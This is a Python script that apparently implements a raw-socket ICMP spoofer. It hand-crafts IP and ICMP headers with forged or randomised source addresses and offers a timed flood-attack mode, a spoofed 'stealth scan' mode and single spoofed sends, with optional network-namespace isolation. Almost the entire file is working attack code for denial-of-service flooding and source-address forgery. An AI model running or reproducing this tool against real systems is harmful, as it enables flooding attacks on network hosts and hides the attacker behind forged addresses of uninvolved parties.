#!/usr/bin/env python3
"""
Raw ICMP Spoofer
================

ICMP packet spoofing tool using raw sockets (no Scapy dependency).
Supports network namespace execution for isolated testing.
"""

import sys
import socket
import struct
import time
import threading
import argparse
import subprocess
import os
from faker import Faker
from colorama import init, Fore, Style

init(autoreset=True)

class RawICMPSpoofer:
    """ICMP packet spoofing using raw sockets"""
    
    def __init__(self, namespace=None):
        self.fake = Faker()
        self.namespace = namespace
        self.attack_stats = {
            'packets_sent': 0,
            'responses_received': 0,
            'bytes_sent': 0
        }
        self.monitoring = False
        self.sock = None
    
    def show_banner(self):
        """Display attack banner"""
        print(f"{Fore.RED}{Style.BRIGHT}")
        print("███████╗██████╗  ██████╗  ██████╗ ███████╗")
        print("██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝")
        print("███████╗██████╔╝██║   ██║██║   ██║█████╗  ")
        print("╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ")
        print("███████║██║     ╚██████╔╝╚██████╔╝██║     ")
        print("╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ")
        print("       RAW SOCKET ICMP SPOOFER")
        if self.namespace:
            print(f"                    Namespace: {self.namespace}")
        print(f"{Style.RESET_ALL}")
    
    def get_namespace_interface(self):
        """Get the interface name within the namespace"""
        if not self.namespace:
            return None
        
        try:
            cmd = ['ip', 'netns', 'exec', self.namespace, 'ip', 'link', 'show']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'veth' in line and 'UP' in line and '@' in line:
                        # Extract interface name (e.g., "v-veth@if26" -> "v-veth")
                        interface = line.split(':')[1].strip().split('@')[0]
                        return interface
            return None
        except:
            return None
    
    def checksum(self, data):
        """Calculate Internet checksum"""
        # Make sure data is even length
        if len(data) % 2:
            data += b'\x00'
        
        # Sum all 16-bit words
        total = 0
        for i in range(0, len(data), 2):
            total += (data[i] << 8) + data[i + 1]
        
        # Add carry
        while total >> 16:
            total = (total & 0xFFFF) + (total >> 16)
        
        # One's complement
        return ~total & 0xFFFF
    
    def craft_ip_header(self, source_ip, dest_ip, payload_length):
        """Craft IP header"""
        version = 4
        header_length = 5  # 5 * 4 = 20 bytes
        tos = 0
        total_length = 20 + payload_length  # IP header + payload
        identification = 54321
        flags = 0
        fragment_offset = 0
        ttl = 64
        protocol = 1  # ICMP
        checksum = 0  # Will be calculated later
        source = socket.inet_aton(source_ip)
        dest = socket.inet_aton(dest_ip)
        
        # Pack header without checksum
        header = struct.pack('!BBHHHBBH4s4s',
                           (version << 4) + header_length,
                           tos,
                           total_length,
                           identification,
                           (flags << 13) + fragment_offset,
                           ttl,
                           protocol,
                           checksum,
                           source,
                           dest)
        
        # Calculate checksum
        checksum = self.checksum(header)
        
        # Repack with correct checksum
        header = struct.pack('!BBHHHBBH4s4s',
                           (version << 4) + header_length,
                           tos,
                           total_length,
                           identification,
                           (flags << 13) + fragment_offset,
                           ttl,
                           protocol,
                           checksum,
                           source,
                           dest)
        
        return header
    
    def craft_icmp_packet(self, icmp_type=8, icmp_code=0, identifier=12345, sequence=1, payload=b''):
        """Craft ICMP packet"""
        checksum = 0  # Will be calculated later
        
        # Pack ICMP header without checksum
        header = struct.pack('!BBHHH',
                           icmp_type,
                           icmp_code,
                           checksum,
                           identifier,
                           sequence)
        
        # Calculate checksum for header + payload
        checksum = self.checksum(header + payload)
        
        # Repack with correct checksum
        header = struct.pack('!BBHHH',
                           icmp_type,
                           icmp_code,
                           checksum,
                           identifier,
                           sequence)
        
        return header + payload
    
    def send_spoofed_packet(self, source_ip, dest_ip, icmp_type=8, icmp_code=0, payload=b'', interface=None):
        """Send spoofed ICMP packet using raw socket"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Bind to specific interface if in namespace
            if interface:
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode())
                except:
                    pass  # Continue without binding if it fails
            
            # Craft packets
            icmp_packet = self.craft_icmp_packet(icmp_type, icmp_code, payload=payload)
            ip_header = self.craft_ip_header(source_ip, dest_ip, len(icmp_packet))
            
            # Complete packet
            packet = ip_header + icmp_packet
            
            # Send packet
            sock.sendto(packet, (dest_ip, 0))
            sock.close()
            
            self.attack_stats['packets_sent'] += 1
            self.attack_stats['bytes_sent'] += len(packet)
            
            return True
            
        except PermissionError:
            print(f"{Fore.RED}Error: Root privileges required for raw sockets")
            return False
        except Exception as e:
            print(f"{Fore.RED}Error sending packet: {e}")
            return False
    
    def display_live_stats(self):
        """Display live attack statistics"""
        while self.monitoring:
            ns_info = f" [ns:{self.namespace}]" if self.namespace else ""
            print(f"\r{Fore.CYAN}LIVE{ns_info}: {self.attack_stats['packets_sent']} packets | "
                  f"{self.attack_stats['bytes_sent']} bytes | "
                  f"{self.attack_stats['responses_received']} responses", end='', flush=True)
            time.sleep(0.5)
    
    def flood_attack(self, target_ip, source_ip=None, duration=60, delay=0.01):
        """Perform flood attack"""
        interface = self.get_namespace_interface() if self.namespace else None
        
        # Use provided source IP or generate random ones
        use_fixed_source = source_ip is not None
        if not use_fixed_source:
            source_ip = self.fake.ipv4()
        
        print(f"{Fore.RED}FLOOD ATTACK")
        print(f"{Fore.YELLOW}Target: {target_ip}")
        print(f"Source: {source_ip}" + (" (fixed)" if use_fixed_source else " (random IPs)"))
        if self.namespace:
            print(f"Namespace: {self.namespace}")
            if interface:
                print(f"Interface: {interface}")
        print(f"Duration: {duration}s")
        print(f"High-speed flood mode activated!")
        
        self.monitoring = True
        stats_thread = threading.Thread(target=self.display_live_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        start_time = time.time()
        sequence = 1
        
        while time.time() - start_time < duration:
            # Use fixed source IP if provided, otherwise generate random ones
            if use_fixed_source:
                current_source = source_ip
            else:
                current_source = self.fake.ipv4()
                
            payload = f"flood_{sequence}".encode()
            
            self.send_spoofed_packet(current_source, target_ip, payload=payload, interface=interface)
            sequence += 1
            
            if delay > 0:
                time.sleep(delay)
        
        self.monitoring = False
        self.show_final_stats()
    
    def stealth_scan(self, target_list, icmp_type=8):
        """Perform stealth scan on multiple targets"""
        interface = self.get_namespace_interface() if self.namespace else None
        
        print(f"{Fore.BLUE}STEALTH SCAN")
        print(f"Targets: {len(target_list)}")
        print(f"ICMP Type: {icmp_type}")
        if self.namespace:
            print(f"Namespace: {self.namespace}")
            if interface:
                print(f"Interface: {interface}")
        
        for target in target_list:
            source_ip = self.fake.ipv4()
            print(f"{Fore.GREEN}Scanning {target} from {source_ip}")
            
            success = self.send_spoofed_packet(source_ip, target, icmp_type=icmp_type, interface=interface)
            if success:
                print(f"{Fore.GREEN}  Packet sent successfully")
            else:
                print(f"{Fore.RED}  Failed to send packet")
            
            time.sleep(0.5)
    
    def show_final_stats(self):
        """Display final attack statistics"""
        print(f"\n\n{Fore.CYAN}ATTACK SUMMARY")
        print("=" * 40)
        print(f"Packets sent: {self.attack_stats['packets_sent']}")
        print(f"Responses received: {self.attack_stats['responses_received']}")
        print(f"Total bytes sent: {self.attack_stats['bytes_sent']}")
        response_rate = (self.attack_stats['responses_received'] / max(self.attack_stats['packets_sent'], 1)) * 100
        print(f"Response rate: {response_rate:.1f}%")
        if self.namespace:
            print(f"Namespace: {self.namespace}")
        print("=" * 40)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Raw Socket ICMP Spoofer (Namespace-aware)')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('--source', help='Source IP to spoof (random if not specified)')
    parser.add_argument('--type', type=int, default=8, help='ICMP type (default: 8 - echo request)')
    parser.add_argument('--code', type=int, default=0, help='ICMP code (default: 0)')
    parser.add_argument('--flood', action='store_true', help='Enable flood mode')
    parser.add_argument('--duration', type=int, default=60, help='Flood duration in seconds')
    parser.add_argument('--delay', type=float, default=0.01, help='Delay between packets')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth scan mode')
    parser.add_argument('--payload', help='Custom payload')
    parser.add_argument('--namespace', help='Network namespace to execute within')
    
    args = parser.parse_args()
    
    # If namespace is specified and we're not already in it, re-exec in namespace
    if args.namespace and not os.environ.get('IN_NETNS'):
        cmd = ['ip', 'netns', 'exec', args.namespace] + sys.argv
        env = os.environ.copy()
        env['IN_NETNS'] = '1'
        os.execvpe('ip', cmd, env)
    
    spoofer = RawICMPSpoofer(args.namespace)
    spoofer.show_banner()
    
    if args.stealth:
        targets = args.target.split(',')
        spoofer.stealth_scan(targets, args.type)
    elif args.flood:
        spoofer.flood_attack(args.target, args.source, args.duration, args.delay)
    else:
        source_ip = args.source or spoofer.fake.ipv4()
        payload = args.payload.encode() if args.payload else b'raw_socket_test'
        interface = spoofer.get_namespace_interface() if args.namespace else None
        
        print(f"{Fore.YELLOW}Sending spoofed ICMP packet:")
        print(f"  Source: {source_ip}")
        print(f"  Target: {args.target}")
        print(f"  Type: {args.type}, Code: {args.code}")
        if args.namespace:
            print(f"  Namespace: {args.namespace}")
            if interface:
                print(f"  Interface: {interface}")
        
        success = spoofer.send_spoofed_packet(source_ip, args.target, args.type, args.code, payload, interface)
        if success:
            print(f"{Fore.GREEN}Packet sent successfully!")
        else:
            print(f"{Fore.RED}Failed to send packet")

if __name__ == '__main__':
    main() 